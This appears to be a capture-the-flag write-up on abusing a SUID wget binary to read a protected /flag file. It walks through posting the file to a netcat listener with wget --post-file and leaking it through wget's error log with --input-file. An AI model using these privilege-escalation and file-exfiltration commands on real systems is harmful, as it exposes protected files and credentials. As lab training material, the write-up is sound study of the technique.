In this level, I had escalated privileges on the command wget and had to use it to read the flag. wget wasn't built to let you read arbitrary files by itself, but with the right flags, it turned out to be entirely possible.

My first method was to write my own web server in assembly, listening on port 1337, built from socket, bind, listen, accept, open, read, and write. I ran that in one terminal, and in another ran:

```bash
wget --post-file=/flag http://127.0.0.1:1337
```

This didn't work. My conclusion at the time was that wget must be dropping its SUID privileges before it ever got around to opening the flag, but that's not actually the case. A SUID wget binary keeps its elevated privileges; that's exactly why misusing SUID wget is a well-documented privilege-escalation technique in the first place, and it's what makes methods two and three below work at all. The real problem was almost certainly on my end: hand-rolling an HTTP server in assembly means manually parsing the raw request to figure out where the headers stop and the POST body starts, and that parsing is an easy place for a bug to hide.

I could have kept debugging that approach and probably gotten it working eventually, but I realized I was overcomplicating things. If all I need is something to listen for the request and show me what it received, I don't need to write a whole server for it, a tool like netcat already does exactly that.

So that's exactly what I did next: I bashed `nc -lvp 1337` in one terminal and the same

```bash
wget --post-file=/flag http://127.0.0.1:1337
```

in another. That got me the flag, cleanly.

After digging a little more, I found another method that's arguably even simpler: making wget leak the flag through its own error log.

```bash
wget --output-file=/dev/stdout --input-file=/flag
```

--input-file normally expects a list of URLs to fetch, one per line. Since /flag isn't a list of URLs, wget fails to parse the line as one, but it echoes the offending content back in the error message it prints when that happens. --output-file=/dev/stdout is what makes that visible: it's wget's logging flag, and by default everything it logs goes to stderr, so pointing it at /dev/stdout instead sends that error message, flag included, straight to the terminal.

Strangely, though, this flag came out wrong while the netcat version was correct. Digging into it, the cause was that the error log lowercases the string somewhere along the way, every uppercase character in the flag got flattened to lowercase. That lines up with how URL parsers commonly behave: scheme and host are case-insensitive by spec, so parsers often normalize them to lowercase automatically. Since part of the flag was being treated as host-like text during the failed parse, it got silently mangled in the process.
